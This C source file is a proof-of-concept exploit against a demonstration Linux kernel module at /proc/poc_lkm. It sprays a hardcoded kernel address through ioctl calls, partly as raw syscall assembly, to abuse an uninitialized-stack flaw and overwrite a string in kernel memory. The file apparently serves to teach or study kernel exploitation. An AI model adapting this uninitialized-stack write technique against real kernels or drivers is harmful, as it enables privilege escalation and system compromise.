// Goal of this PoC attack :
// - "Hello_World" string is living in poc_lkm.c
// - Modify from "Hello_World" to "AttackWorld" via exploiting uninitialized stack vulnerability.
//
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <asm/unistd.h>
#include <stdint.h>

struct poc_lkm_size {
	char dummy[128];
};

struct poc_lkm_st_0 {
	int val;
	char name[128];
	unsigned long low;
	unsigned long high;
	unsigned int flags;
	unsigned short mode;
	unsigned short signal;
};

struct poc_lkm_st_1 {
	char name[16];
	unsigned int dummy;
	unsigned int datasize;
	unsigned char *data;
};

struct poc_lkm_user_st {
	unsigned int datasize;
	unsigned char *data;
};

#define POC_LKM_IOCTL_MAGIC ('P')
#define POC_LKM_CMD_0 _IOWR(POC_LKM_IOCTL_MAGIC, 0, struct poc_lkm_size)
#define POC_LKM_CMD_1 _IOWR(POC_LKM_IOCTL_MAGIC, 1, struct poc_lkm_size)
#define POC_LKM_CMD_2 _IOWR(POC_LKM_IOCTL_MAGIC, 2, struct poc_lkm_size)

int fd;
unsigned char udata[128] = {0x11,};
unsigned long target_addr = 0xffffffffc05db100UL;	/* should be modified */
char *attack_str = "Attack";

void do_wrapper_call(void)
{
	int r;
	int i, j;
	struct poc_lkm_user_st ust;

	ust.datasize = 128;
	ust.data = udata;
	for (i=0; i<(128/8); i++) {
		for (j=0; j<8; j++) {
			udata[i * 8 + j] = ((unsigned char *)&target_addr)[j];
		}
	}

	r = ioctl(fd, POC_LKM_CMD_0, &ust);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_0 failed\n");
		return;
	}

	ust.datasize = 6;
	ust.data = attack_str;
	r = ioctl(fd, POC_LKM_CMD_1, &ust);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_0 failed\n");
		return;
	}

	r = ioctl(fd, POC_LKM_CMD_2, &ust);
	if (r < 0) {
		printf("[-] POC_LKM_CMD_0 failed\n");
		return;
	}
}

void do_asm_call(void)
{
	int r;
	struct poc_lkm_user_st ust;
	unsigned long syscall_num = __NR_ioctl;
	unsigned long cmd = POC_LKM_CMD_0;
	unsigned long ulfd = (unsigned long)fd;

	ust.datasize = 32;
	ust.data = udata;

	asm volatile(
		"movq %0, %%rax\n\t"
		"movq %1, %%rdi\n\t"
		"movq %2, %%rsi\n\t"
		"movq %3, %%rdx\n\t"
		"syscall"
		: /* No output */
		: "r"(syscall_num), "r"(ulfd), "r"(cmd), "r"(&ust)
		: );

	cmd = POC_LKM_CMD_1;
	asm volatile(
		"movq %0, %%rax\n\t"
		"movq %1, %%rdi\n\t"
		"movq %2, %%rsi\n\t"
		"movq %3, %%rdx\n\t"
		"syscall"
		: /* No output */
		: "r"(syscall_num), "r"(ulfd), "r"(cmd), "r"(&ust)
		: );
}

int main(int argc, char **argv)
{
	fd = open("/proc/poc_lkm", O_RDWR);
	if (fd < 0) {
		printf("[-] open /proc/poc_lkm failed\n");
		return 0;
	}

	do_wrapper_call();

	close(fd);
	return 0;
}
